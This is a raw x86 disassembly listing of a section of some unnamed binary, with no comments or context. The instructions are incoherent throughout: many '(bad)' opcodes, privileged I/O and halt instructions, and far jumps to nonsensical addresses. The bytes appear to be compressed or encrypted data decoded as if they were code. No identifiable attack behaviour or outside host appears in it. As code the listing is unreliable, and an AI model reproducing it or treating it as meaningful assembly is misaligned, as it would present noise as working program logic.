  42cd93:	enter  0x1ac8,0x1a
  42cd97:	xchg   edx,eax
  42cd98:	xor    DWORD PTR [edx],ecx
  42cd9a:	sti    
  42cd9b:	sub    esp,ecx
  42cd9d:	inc    esp
  42cd9e:	cmp    ebx,ebp
  42cda0:	popa   
  42cda1:	jne    0x42cdf6
  42cda3:	add    dh,cl
  42cda5:	mov    ecx,0x1835c624
  42cdaa:	inc    ebx
  42cdab:	lahf   
  42cdac:	retf   0x5d28
  42cdaf:	inc    esi
  42cdb0:	xchg   BYTE PTR [eax],bl
  42cdb2:	and    al,0xdb
  42cdb4:	mov    ebx,0xb18bd0f5
  42cdb9:	adc    dh,bl
  42cdbb:	outs   dx,DWORD PTR ds:[esi]
  42cdbc:	pop    edi
  42cdbd:	push   esi
  42cdbe:	cwde   
  42cdbf:	call   0x42ce8d
	...
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0x9119410a
  42ce41:	(bad)  
  42ce42:	ds jge 0x42cdd1
  42ce45:	fiadd  DWORD PTR [ecx]
  42ce47:	add    ch,dh
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    ah,ah
  42ce4d:	mov    esi,0xc83a1249
  42ce52:	mov    al,ds:0x9d8ea5d4
  42ce57:	and    bh,BYTE PTR [esi]
  42ce59:	push   esi
  42ce5a:	fcom   DWORD PTR [ecx+ebp*1-0x4e19cac3]
  42ce61:	mov    ebx,0x51bebea4
  42ce66:	xchg   DWORD PTR [ebx+0x3d],ebp
  42ce69:	and    al,BYTE PTR ds:0x72fc2aec
  42ce6f:	mov    eax,0x64b5df46
  42ce74:	iret   
  42ce75:	xchg   esi,eax
  42ce76:	sub    BYTE PTR [esi+0x3],cl
  42ce79:	xchg   ecx,eax
  42ce7a:	pop    edi
  42ce7b:	jmp    0xe10d:0x82be7acf
  42ce82:	or     al,0x63
  42ce84:	push   ebp
  42ce85:	xor    DWORD PTR [ebx+0x38a89c0a],ebp
  42ce8b:	jnp    0x42cec3
  42ce8d:	cli    
  42ce8e:	ret    0x1369
  42ce91:	mov    edx,0x916956ab
  42ce96:	cmp    al,0xa
  42ce98:	test   al,0x4d
  42ce9a:	cmp    al,0xb6
  42ce9c:	adc    al,0x52
  42ce9e:	dec    DWORD PTR [ebp-0x34]
  42cea1:	out    0xed,eax
  42cea3:	rol    DWORD PTR [eax+edi*8+0x62b55290],cl
  42ceaa:	push   es
  42ceab:	pop    ebx
  42ceac:	mov    DWORD PTR [edi+0x1d],esi
  42ceaf:	xor    DWORD PTR [esp+edi*1],esp
  42ceb2:	xor    bh,BYTE PTR [ecx+ecx*1+0x49]
  42ceb6:	pop    esp
  42ceb7:	aaa    
  42ceb8:	jns    0x42ceca
  42ceba:	loop   0x42cf04
  42cebc:	mov    edi,DWORD PTR [edi]
  42cebe:	stos   DWORD PTR es:[edi],eax
  42cebf:	shl    BYTE PTR ds:0x6496a5d8,cl
  42cec5:	sbb    bl,dh
  42cec7:	inc    ebp
  42cec8:	(bad)  
  42ceca:	aas    
  42cecb:	jmp    0x657777d9
  42ced0:	push   ebx
  42ced1:	and    bl,BYTE PTR [ebp-0x7d]
  42ced4:	fst    DWORD PTR [esp+eiz*8+0xf4048fe]
  42cedb:	stc    
  42cedc:	mov    ch,al
  42cede:	enter  0x117c,0xad
  42cee2:	leave  
  42cee3:	or     DWORD PTR [esi-0x21fe3e8f],ebp
  42cee9:	xor    edx,DWORD PTR [ecx-0x3e9509fe]
  42ceef:	ror    BYTE PTR [edx],0xc9
  42cef2:	imul   ebp,ecx,0xc089b08b
  42cef8:	in     al,0x82
  42cefa:	jnp    0x42ced3
  42cefc:	scas   al,BYTE PTR es:[edi]
  42cefd:	xor    dl,dl
  42ceff:	repnz loopne 0x42cf37
  42cf02:	aad    0x4e
  42cf04:	pop    ss
  42cf05:	or     ecx,DWORD PTR [esi-0x4c541dca]
  42cf0b:	push   esi
  42cf0c:	or     BYTE PTR [edi+0x71],dl
  42cf0f:	jnp    0x42cf16
  42cf11:	add    al,cl
  42cf13:	outs   dx,BYTE PTR ds:[esi]
  42cf14:	add    al,0x4c
  42cf16:	pop    esi
  42cf17:	pop    ss
  42cf18:	mov    dh,0x47
  42cf1a:	sub    DWORD PTR [edi+0x5de67576],edx
  42cf20:	aaa    
  42cf21:	std    
  42cf22:	jecxz  0x42cf96
  42cf24:	xchg   esp,eax
  42cf25:	outs   dx,BYTE PTR ds:[esi]
  42cf26:	inc    edx
  42cf27:	xchg   esp,eax
  42cf28:	test   al,0xdf
  42cf2a:	pop    ss
  42cf2b:	cmp    al,0x1f
  42cf2d:	xchg   ebx,eax
  42cf2e:	push   ds
  42cf2f:	sub    edi,DWORD PTR [ecx+0x42]
  42cf32:	ficomp WORD PTR [ebx-0x24]
  42cf35:	sbb    dh,BYTE PTR cs:[ecx+0x2114e3be]
  42cf3c:	leave  
  42cf3d:	xchg   ebx,eax
  42cf3e:	rol    BYTE PTR [edi+0xd9],1
	...
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x7f
  42cfc1:	mov    bh,0x32
  42cfc3:	xor    BYTE PTR [ecx-0xafffe25],al
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    BYTE PTR [esi-0x7520596b],cl
  42cfd1:	mov    ebp,0xfe497a87
  42cfd6:	mov    bl,0x6b
  42cfd8:	pop    ecx
  42cfd9:	nop
  42cfda:	xor    BYTE PTR [eax+eiz*2+0x6cef029d],ah
  42cfe1:	jae    0x42cfa0
  42cfe3:	scas   al,BYTE PTR es:[edi]
  42cfe4:	xchg   ebp,eax
  42cfe5:	mov    ah,0x87
  42cfe7:	bound  esp,QWORD PTR [di+0x2d]
  42cfeb:	adc    bh,BYTE PTR [eax]
  42cfed:	xor    eax,0x347d9ef
  42cff2:	cwde   
  42cff3:	xchg   cx,ax
  42cff5:	and    esi,DWORD PTR [ebx+0x6c9e48b6]
  42cffb:	dec    ebp
  42cffc:	rol    DWORD PTR [ebx],cl
  42cffe:	mov    WORD PTR [eax+0x3a],fs
  42d001:	out    dx,eax
  42d002:	mov    ah,0x74
  42d004:	mov    ebp,0x6e24e7ea
  42d009:	shl    DWORD PTR [ebx*4-0x25c916c6],cl
  42d010:	pop    ebx
  42d011:	test   eax,0x30065af
  42d016:	push   cs
  42d017:	and    ebx,edi
  42d019:	aaa    
  42d01a:	adc    eax,0xe8f331a1
  42d01f:	sar    BYTE PTR [esi+0x4ce7d910],0xf8
  42d026:	leave  
  42d027:	push   edx
  42d028:	pop    edx
  42d029:	(bad)  
  42d02a:	push   edx
  42d02b:	outs   dx,DWORD PTR ds:[esi]
  42d02c:	jb     0x42d009
  42d02e:	inc    ecx
  42d02f:	push   es
  42d030:	rcl    DWORD PTR [ecx],cl
  42d032:	sub    al,0x66
  42d035:	inc    BYTE PTR [eax-0x1c]
  42d038:	scas   eax,DWORD PTR es:[edi]
  42d039:	sar    BYTE PTR [ebp-0xac93a1a],0xa5
  42d040:	jl     0x42cfc3
  42d042:	cmp    dl,BYTE PTR [eax-0x27]
  42d045:	mov    ah,0x98
  42d047:	pop    ebx
  42d048:	test   eax,0x9630815f
  42d04d:	adc    DWORD PTR [edi-0x57],ebp
  42d050:	mul    BYTE PTR [edx]
  42d052:	ins    DWORD PTR es:[edi],dx
  42d053:	sub    dl,bl
  42d055:	fs and eax,0x6948e097
  42d05b:	push   ebx
  42d05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d05d:	in     eax,0x8f
  42d05f:	and    DWORD PTR [eax+ecx*2+0x10],eax
  42d063:	fisub  DWORD PTR [eax-0x7d]
  42d066:	mov    ecx,0x61479812
  42d06b:	lds    esp,FWORD PTR ds:0xbccdd2ff
  42d071:	push   ss
  42d072:	sub    BYTE PTR [eax+ebp*1-0x79],al
  42d076:	dec    esp
  42d077:	sub    bl,bh
  42d079:	jno    0x42d0c3
  42d07b:	inc    eax
  42d07c:	or     dh,cl
  42d07e:	xchg   ecx,eax
  42d07f:	fist   WORD PTR [edi-0x60c4fb0]
  42d085:	sub    al,0x12
  42d087:	(bad)  
  42d088:	xchg   ebp,eax
  42d089:	xchg   ebx,eax
  42d08a:	(bad)  
  42d08b:	sub    ah,BYTE PTR [esi]
  42d08d:	or     al,0x53
  42d08f:	enter  0x9d7a,0x6e
  42d093:	aas    
  42d094:	push   esi
  42d095:	and    eax,0xfd10e5b5
  42d09a:	push   0x74
  42d09c:	jl     0x42d069
  42d09e:	and    eax,0x3bcd30aa
  42d0a3:	out    0x9b,al
  42d0a5:	dec    ecx
  42d0a6:	pop    es
  42d0a7:	fisttp QWORD PTR [edi+0x77]
  42d0aa:	jp     0x42d040
  42d0ac:	sbb    DWORD PTR [esi],0x48
  42d0af:	xchg   edx,eax
  42d0b0:	shl    eax,0x17
  42d0b3:	fcmovnbe st,st(3)
  42d0b5:	pop    esi
  42d0b6:	pop    esi
  42d0b7:	or     DWORD PTR [ebp+0x6a14498f],eax
  42d0bd:	adc    edx,DWORD PTR [edx]
  42d0bf:	(bad)
	...
  42d132:	add    BYTE PTR [eax],al
  42d134:	imul   eax,DWORD PTR [edx-0x10105133],0x9941c76b
  42d13e:	xor    eax,0xbd584350
  42d143:	mov    eax,ds:0x1dc76
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    BYTE PTR [ecx-0x41],al
  42d14e:	iret   
  42d14f:	ja     0x42d171
  42d151:	or     al,0x19
  42d153:	fstp   DWORD PTR [esi-0x15]
  42d156:	fwait
  42d157:	bound  ecx,QWORD PTR [eax+eiz*2]
  42d15a:	sub    eax,0x9b1e43fd
  42d15f:	mov    bh,0x4b
  42d161:	(bad)  
  42d162:	aas    
  42d163:	dec    ecx
  42d164:	sti    
  42d165:	mov    edx,0xb4920641
  42d16a:	dec    edi
  42d16b:	jno    0x42d136
  42d16d:	mov    eax,0x315c9059
  42d172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d173:	and    BYTE PTR [ebx-0x47dbc042],dl
  42d179:	(bad)  
  42d17a:	pop    ebx
  42d17b:	pop    ecx
  42d17c:	and    ah,ch
  42d17e:	(bad)  
  42d17f:	sbb    cl,dh
  42d181:	xchg   esi,eax
  42d182:	push   ebp
  42d183:	mov    bh,0xaf
  42d185:	jns    0x42d1d3
  42d187:	inc    esp
  42d188:	loop   0x42d19e
  42d18a:	inc    edi
  42d18b:	sbb    eax,0x5c915e21
  42d190:	xchg   edx,eax
  42d191:	into   
  42d192:	js     0x42d13d
  42d194:	jns    0x42d206
  42d196:	(bad)  
  42d197:	hlt    
  42d198:	xchg   ebx,eax
  42d199:	out    0x11,eax
  42d19b:	add    cl,BYTE PTR [ebx]
  42d19d:	adc    DWORD PTR [esi],ebx
  42d19f:	retf   0xbec3
  42d1a2:	cdq    
  42d1a3:	mov    cl,0xaa
  42d1a5:	mov    bl,0x6f
  42d1a7:	mov    fs,WORD PTR [esi+0x3681383b]
  42d1ad:	ret    
  42d1ae:	(bad)  
  42d1af:	je     0x42d1cb
  42d1b1:	sbb    eax,0x395079de
  42d1b6:	xchg   ebx,eax
  42d1b7:	out    0x9c,al
  42d1b9:	out    0xe7,al
  42d1bb:	push   es
  42d1bc:	hlt    
  42d1bd:	mov    dh,0xac
  42d1bf:	cmp    BYTE PTR [eax+0x188696c8],ch
  42d1c5:	ja     0x42d242
  42d1c7:	imul   ebx,esi,0xcea2d1d3
  42d1cd:	cmp    esi,ecx
  42d1cf:	mov    ah,BYTE PTR [edi+ebp*1-0x23417c58]
  42d1d6:	xor    al,0xbd
  42d1d8:	shl    BYTE PTR [eax+ecx*2],0x83
  42d1dc:	int3   
  42d1dd:	or     DWORD PTR [eax],esi
  42d1df:	sahf   
  42d1e0:	mov    ah,0x2
  42d1e2:	sub    al,0x83
  42d1e4:	inc    esp
  42d1e5:	call   0x25e61539
  42d1ea:	mov    eax,ds:0xcf23fd0d
  42d1ef:	add    bh,BYTE PTR [ebx+0x4cdd5ba8]
  42d1f5:	xor    dh,BYTE PTR [ebx*1+0x7760d9ea]
  42d1fc:	or     al,0x7e
  42d1fe:	push   ds
  42d1ff:	enter  0x9539,0xf
  42d203:	mov    ah,0x8e
  42d205:	sbb    al,BYTE PTR [edx-0x47]
  42d208:	test   BYTE PTR [ebp+0x2f],ah
  42d20b:	popf   
  42d20c:	ss (bad) 
  42d20e:	and    DWORD PTR ds:0xb0c38a85,edx
  42d214:	inc    ebx
  42d215:	jb     0x42d227
  42d217:	and    bh,BYTE PTR [esi+0x11dc4f47]
  42d21d:	lods   al,BYTE PTR ds:[esi]
  42d21e:	mov    DWORD PTR [ecx-0x8ab6889],esp
  42d224:	cs cli 
  42d226:	pop    DWORD PTR [eax]
  42d228:	xchg   edx,eax
  42d229:	and    DWORD PTR [edi],esp
  42d22b:	cmp    al,0x76
  42d22d:	jmp    0x6e26e8c9
  42d232:	das    
  42d233:	sbb    al,BYTE PTR [ebx+ecx*8]
  42d236:	call   0xb90:0x9ad70e84
  42d23d:	icebp  
  42d23e:	leave  
  42d23f:	dec    esi
  42d240:	xchg   edi,eax
	...
  42d2b1:	add    BYTE PTR [eax],al
  42d2b3:	add    dh,ah
  42d2b5:	psubusw mm5,QWORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	inc    ebx
  42d2c1:	push   0xfffffff3
  42d2c3:	jmp    0xf5:0x1dd6b
  42d2ca:	add    BYTE PTR [eax],al
  42d2cc:	jp     0x42d26d
  42d2ce:	mov    al,0xce
  42d2d0:	push   esi
  42d2d1:	stos   DWORD PTR es:[edi],eax
  42d2d2:	sub    DWORD PTR [edi-0xf],eax
  42d2d5:	stc    
  42d2d6:	jae    0x42d287
  42d2d8:	push   esp
  42d2d9:	pop    ebp
  42d2da:	and    al,0x8d
  42d2dc:	sbb    ebp,DWORD PTR ds:0x9dc28672
  42d2e2:	xchg   esi,eax
  42d2e3:	push   edi
  42d2e4:	jg     0x42d30a
  42d2e6:	lock mov DWORD PTR [ebp-0x77825d16],ecx
  42d2ed:	xor    DWORD PTR [ebp+0x209a7739],ebx
  42d2f3:	inc    ebx
  42d2f4:	dec    esi
  42d2f5:	push   esp
  42d2f6:	packuswb mm4,mm4
  42d2f9:	mov    dl,0xde
  42d2fb:	or     DWORD PTR [ebx],ebx
  42d2fd:	les    esp,FWORD PTR [eax]
  42d2ff:	cdq    
  42d300:	jb     0x42d294
  42d302:	mov    edi,0x3452fd99
  42d307:	sti    
  42d308:	or     DWORD PTR [esi+ecx*4-0x5197a068],edi
  42d30f:	je     0x42d2f1
  42d311:	adc    eax,0x8f3825e8
  42d316:	cmp    DWORD PTR [edx],edx
  42d318:	outs   dx,BYTE PTR ds:[esi]
  42d319:	mov    ch,0x73
  42d31b:	xchg   edx,eax
  42d31c:	xor    DWORD PTR [ecx],esp
  42d31e:	sbb    al,0x8b
  42d320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d321:	test   al,0x39
  42d323:	ins    BYTE PTR es:[edi],dx
  42d324:	and    ah,dh
  42d326:	enter  0xae0c,0xd
  42d32a:	in     eax,dx
  42d32b:	imul   edx,DWORD PTR [ebp+0x31],0x2c3fc56
  42d332:	sbb    ecx,0x78
  42d335:	xchg   esi,eax
  42d336:	or     BYTE PTR [ebx],cl
  42d338:	std    
  42d339:	ss sub eax,0x2a220050
  42d33f:	push   esi
  42d340:	jmp    0x42d351
  42d342:	jp     0x42d3bb
  42d344:	dec    esi
  42d345:	xchg   esi,eax
  42d346:	sahf   
  42d347:	mov    dh,0x56
  42d349:	cs pop eax
  42d34b:	aam    0x2f
  42d34d:	mov    bl,bl
  42d34f:	shr    BYTE PTR [ecx-0x33],0x5c
  42d353:	dec    ebx
  42d354:	xchg   edi,eax
  42d355:	pop    eax
  42d356:	mov    dh,ch
  42d358:	xchg   edi,eax
  42d359:	sbb    al,0x6d
  42d35b:	cmp    DWORD PTR [esi],ecx
  42d35d:	or     BYTE PTR [ebp+0x232f738e],al
  42d363:	jb     0x42d330
  42d365:	paddb  mm6,QWORD PTR [ecx-0x61]
  42d369:	pop    ebp
  42d36a:	cmp    cl,BYTE PTR [edi]
  42d36c:	mov    ch,0xf5
  42d36e:	or     eax,0x1c01c84a
  42d373:	pextrw edi,(bad),0xc5
  42d375:	jp     0x42d35c
  42d377:	xchg   esp,eax
  42d378:	loopne 0x42d330
  42d37a:	retf   
  42d37b:	push   edx
  42d37c:	je     0x42d314
  42d37e:	mov    ebx,0x1767edf5
  42d383:	sbb    ch,BYTE PTR [edx+0x77]
  42d386:	jne    0x42d387
  42d388:	int3   
  42d389:	inc    BYTE PTR [eax-0x19529a7a]
  42d38f:	ret    
  42d390:	jmp    DWORD PTR [esi-0x59230a19]
  42d396:	jle    0x42d34b
  42d398:	xlat   BYTE PTR ds:[ebx]
  42d399:	sar    eax,1
  42d39b:	nop
  42d39c:	jne    0x42d3ca
  42d39e:	loopne 0x42d395
  42d3a0:	test   DWORD PTR [esi*4+0x316346c9],edi
  42d3a7:	adc    BYTE PTR ds:0x1f0cab71,al
  42d3ad:	mov    bh,0x1a
  42d3af:	mov    esp,0xe18990b9
  42d3b4:	repnz dec esp
  42d3b6:	div    DWORD PTR [esi-0x34d488eb]
  42d3bc:	ds repnz arpl cx,ax
  42d3c0:	jg     0x42d3c2
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xd1f0781
  42d442:	mov    cl,BYTE PTR [ecx+0x60]
  42d445:	fiadd  WORD PTR [ecx]
  42d447:	add    ch,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [esp+eiz*8-0x66170420],ch
  42d452:	mov    eax,ds:0xebbbb214
  42d457:	pop    ds
  42d458:	rcr    ebp,0x3f
  42d45b:	js     0x42d473
  42d45d:	xchg   edi,eax
  42d45e:	xchg   edi,eax
  42d45f:	pop    edi
  42d460:	clc    
  42d461:	jnp    0x42d4c3
  42d463:	add    DWORD PTR [edx+0x60],ecx
  42d466:	popf   
  42d467:	in     eax,dx
  42d468:	leave  
  42d469:	scas   al,BYTE PTR es:[edi]
  42d46a:	xchg   esp,eax
  42d46b:	neg    DWORD PTR [edx+0x198af0a3]
  42d471:	lds    eax,FWORD PTR [esi-0x691d1d95]
  42d477:	mov    esp,0xb4d69516
  42d47c:	mov    fs,WORD PTR ds:0x3f1a0020
  42d482:	pushf  
  42d483:	sbb    al,0x1b
  42d485:	or     DWORD PTR [esp+ecx*2-0x45],ebp
  42d489:	inc    esi
  42d48a:	jp     0x42d423
  42d48c:	jne    0x42d4e2
  42d48e:	cmp    DWORD PTR [ecx+esi*4+0x3e],0x35
  42d493:	ds retf 
  42d495:	mov    ebp,0xb81c184b
  42d49a:	adc    ah,BYTE PTR [esi+0x9b10900]
  42d4a0:	stos   BYTE PTR es:[edi],al
  42d4a1:	sar    dl,cl
  42d4a3:	(bad)  
  42d4a4:	out    dx,al
  42d4a5:	fld    TBYTE PTR [ebp+0x7255a06d]
  42d4ab:	inc    esi
  42d4ac:	xchg   DWORD PTR [ebp-0x7ab1b25],edi
  42d4b2:	push   0xd6b349b1
  42d4b7:	or     eax,0xc26c1802
  42d4bc:	jp     0x42d525
  42d4be:	mov    dl,0x5c
  42d4c0:	sub    al,0xc4
  42d4c2:	mov    eax,DWORD PTR [ebp-0x7c]
  42d4c5:	(bad)  
  42d4c6:	daa    
  42d4c7:	push   0xffffffa5
  42d4c9:	adc    ecx,edi
  42d4cb:	jle    0x42d4c4
  42d4cd:	jge    0x42d481
  42d4cf:	sahf   
  42d4d0:	arpl   WORD PTR [edi+0x1a3e883a],di
  42d4d6:	pop    ebx
  42d4d7:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42d4d9:	and    DWORD PTR [ebx+0x12],eax
  42d4dc:	cld    
  42d4dd:	mov    DWORD PTR [esi+0x7b],esi
  42d4e0:	pusha  
  42d4e1:	sbb    eax,0xf69216b5
  42d4e6:	xlat   BYTE PTR ds:[ebx]
  42d4e7:	inc    edi
  42d4e8:	retf   
  42d4e9:	and    al,0x1b
  42d4eb:	(bad)  
  42d4ec:	enter  0x102d,0x8b
  42d4f0:	or     eax,esp
  42d4f2:	ins    DWORD PTR es:[edi],dx
  42d4f3:	pusha  
  42d4f4:	repz aad 0xf
  42d4f7:	mov    ch,0xee
  42d4f9:	int    0x47
  42d4fb:	mov    cl,0xd8
  42d4fd:	bnd cs jb 0x42d526
  42d501:	pop    es
  42d502:	sub    al,BYTE PTR [edx]
  42d504:	js     0x42d535
  42d506:	inc    ebp
  42d507:	arpl   di,cx
  42d509:	pop    ebx
  42d50a:	int    0xbd
  42d50c:	and    DWORD PTR [edx-0x6b60bdee],edx
  42d512:	jge    0x42d53f
  42d514:	sub    al,0x2c
  42d516:	mov    bh,0x5b
  42d518:	push   0x79
  42d51a:	mov    eax,0x3fbfb2b8
  42d51f:	dec    esp
  42d520:	cmp    BYTE PTR [edi-0x2f],al
  42d523:	fstp   QWORD PTR [esi-0x6b105cfa]
  42d529:	mov    DWORD PTR ds:0xee3b7efa,ebx
  42d52f:	gs dec eax
  42d531:	mov    ebp,esp
  42d533:	jp     0x42d52a
  42d535:	jo     0x42d4bc
  42d537:	std    
  42d538:	inc    ebp
  42d539:	je     0x42d514
  42d53b:	push   eax
  42d53c:	cmp    dh,BYTE PTR [eax+0x35]
  42d53f:	dec    edx
  42d540:	inc    BYTE PTR [eax]
	...
  42d5b2:	add    BYTE PTR [eax],al
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	dec    edi
  42d5c1:	jae    0x42d5a4
  42d5c3:	push   0x1df55
  42d5c8:	cmc    
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [esi-0x5c],bl
  42d5ce:	push   esp
  42d5cf:	out    dx,al
  42d5d0:	and    eax,0x1dd32701
  42d5d5:	jle    0x42d617
  42d5d7:	inc    edi
  42d5d8:	cwde   
  42d5d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5da:	(bad)  
  42d5dd:	ds sahf 
  42d5df:	lea    esp,[edi+0x37cfb3bb]
  42d5e5:	std    
  42d5e6:	add    dh,ch
  42d5e8:	push   ebx
  42d5e9:	clc    
  42d5ea:	je     0x42d624
  42d5ec:	push   0x2dfd2966
  42d5f1:	shr    BYTE PTR [edi-0x3c],1
  42d5f4:	mov    ebx,0x50998939
  42d5f9:	out    dx,eax
  42d5fa:	in     al,0x1a
  42d5fc:	add    BYTE PTR [ebx-0x35],0x4f
  42d600:	dec    edx
  42d601:	mov    al,ds:0xf2440f1d
  42d606:	ss into 
  42d608:	lock cmp al,0xfc
  42d60b:	(bad)  
  42d60c:	lods   eax,DWORD PTR ds:[esi]
  42d60d:	add    dh,ah
  42d60f:	int    0xfa
  42d611:	push   eax
  42d612:	mov    edx,0xa2a736ed
  42d617:	je     0x42d638
  42d619:	push   edi
  42d61a:	add    eax,0xe4aaff67
  42d61f:	xchg   edi,eax
  42d620:	mov    ds:0xa5a46714,al
  42d625:	ds inc edi
  42d627:	pop    ebx
  42d628:	repz sbb BYTE PTR [edx+0x655d2799],ah
  42d62f:	test   DWORD PTR [ebp-0x4d6e2df9],0x545b9b78
  42d639:	jp     0x42d697
  42d63b:	cwde   
  42d63c:	sub    ebx,ebx
  42d63e:	call   0xb871:0x314c1f47
  42d645:	push   ebx
  42d646:	and    BYTE PTR [ebx],0xb2
  42d649:	sub    dl,BYTE PTR [edi]
  42d64b:	pop    esp
  42d64c:	nop
  42d64d:	pop    eax
  42d64e:	mov    bl,BYTE PTR es:[edx+0x5124799e]
  42d655:	push   edi
  42d656:	cdq    
  42d657:	cli    
  42d658:	adc    eax,0x35cc4290
  42d65d:	shl    DWORD PTR [edx-0x12],0x78
  42d661:	ins    BYTE PTR es:[edi],dx
  42d662:	shl    edi,0xbd
  42d665:	(bad)  
  42d666:	stc    
  42d667:	je     0x42d686
  42d669:	push   edi
  42d66a:	fld    QWORD PTR [eax+0x23a2af43]
  42d670:	mov    edi,0xcfe7e55e
  42d675:	rcr    edi,cl
  42d677:	xchg   ecx,eax
  42d678:	mov    esp,0x5011bbfa
  42d67d:	pop    eax
  42d67e:	daa    
  42d67f:	adc    al,0xf4
  42d681:	xchg   ebx,eax
  42d682:	pop    esi
  42d683:	sbb    ecx,edi
  42d685:	xchg   edi,eax
  42d686:	fdivr  st(1),st
  42d688:	repnz retf 
  42d68a:	cmp    dl,bh
  42d68c:	aas    
  42d68d:	pop    es
  42d68e:	push   es
  42d68f:	or     DWORD PTR [edx],edi
  42d691:	jae    0x42d62f
  42d693:	jbe    0x42d70f
  42d695:	dec    ebp
  42d696:	ja     0x42d647
  42d698:	ds pop eax
  42d69a:	nop
  42d69b:	test   BYTE PTR [ebp-0x78d0e8c3],ah
  42d6a1:	mov    esp,0xe83ac97c
  42d6a6:	sub    DWORD PTR [ecx],edi
  42d6a8:	or     esp,0xffffff86
  42d6ab:	xlat   BYTE PTR ds:[ebx]
  42d6ac:	sub    ebx,DWORD PTR [edi-0x54]
  42d6af:	mov    bl,al
  42d6b1:	into   
  42d6b2:	inc    ebx
  42d6b3:	and    esi,0xffffffe5
  42d6b6:	sbb    BYTE PTR [edi*1-0x323a67cf],ah
  42d6bd:	inc    ecx
  42d6be:	jle    0x42d716
  42d6c0:	mov    esi,0x0
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	dec    edx
  42d741:	cmp    ebp,eax
  42d743:	xor    eax,0x1e04a
  42d748:	cmc    
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    dh,ch
  42d74d:	dec    eax
  42d74e:	data16 repnz xor BYTE PTR [esi+0x32bfba48],ah
  42d756:	icebp  
  42d757:	push   0x94fed255
  42d75c:	cmp    al,0xf2
  42d75e:	and    eax,0xa6d802bb
  42d763:	pop    ecx
  42d764:	pop    es
  42d765:	sbb    BYTE PTR [edi-0x71e8b521],ah
  42d76b:	or     eax,0x5f55f664
  42d770:	out    0x3d,eax
  42d772:	fwait
  42d773:	or     eax,0x14add15e
  42d778:	adc    bl,BYTE PTR [ebp+0xe621226]
  42d77e:	xchg   edi,eax
  42d77f:	aad    0x45
  42d781:	(bad)  
  42d782:	jne    0x42d71b
  42d784:	iret   
  42d785:	dec    ebx
  42d786:	icebp  
  42d787:	inc    BYTE PTR [ebx]
  42d789:	(bad)  
  42d78a:	cmp    dh,cl
  42d78c:	icebp  
  42d78d:	mov    eax,ds:0xbac8ed25
  42d792:	iret   
  42d793:	push   ss
  42d794:	dec    esi
  42d795:	inc    eax
  42d796:	mov    eax,0x9875726e
  42d79b:	sbb    al,0x25
  42d79d:	push   ebp
  42d79e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d79f:	pop    edx
  42d7a0:	repz sbb dh,0x59
  42d7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7a5:	je     0x42d75c
  42d7a7:	retf   
  42d7a8:	pop    edi
  42d7a9:	cmp    al,0x4
  42d7ab:	push   eax
  42d7ac:	push   0x715c0b6e
  42d7b1:	js     0x42d7e2
  42d7b3:	fldenv [esi]
  42d7b5:	mov    cl,0x1a
  42d7b7:	mov    ebx,0xbabdeadd
  42d7bc:	push   es
  42d7bd:	(bad)  
  42d7be:	fdivr  DWORD PTR [eax+0x38a3abfb]
  42d7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7c5:	or     DWORD PTR [edx+eiz*4+0x62],esp
  42d7c9:	mov    ecx,0x31cf6a94
  42d7cf:	dec    ebp
  42d7d0:	(bad)  
  42d7d1:	jnp    0x42d7af
  42d7d3:	pop    edi
  42d7d4:	and    BYTE PTR [ebx],cl
  42d7d6:	mov    ds:0x3b56f555,al
  42d7db:	clc    
  42d7dc:	cmp    eax,DWORD PTR [eax+0x73]
  42d7df:	ss pop es
  42d7e1:	outs   dx,DWORD PTR ds:[esi]
  42d7e2:	mov    ecx,0x315f32bc
  42d7e7:	sub    BYTE PTR [edi],ch
  42d7e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d7ea:	push   0xfffffff4
  42d7ec:	jge    0x42d82f
  42d7ee:	mov    BYTE PTR [eax],ch
  42d7f0:	adc    al,0x54
  42d7f2:	jne    0x42d79f
  42d7f4:	pop    edi
  42d7f5:	enter  0xd648,0x9f
  42d7f9:	mov    ch,0x5b
  42d7fb:	fldenv [eax-0x4d]
  42d7fe:	nop
  42d7ff:	ret    0x2bfc
  42d802:	scas   eax,DWORD PTR es:[edi]
  42d803:	jmp    0x728:0x57f5deec
  42d80a:	stc    
  42d80b:	sbb    edi,edi
  42d80d:	pushf  
  42d80e:	mov    esp,0xc5bc68e0
  42d813:	inc    esp
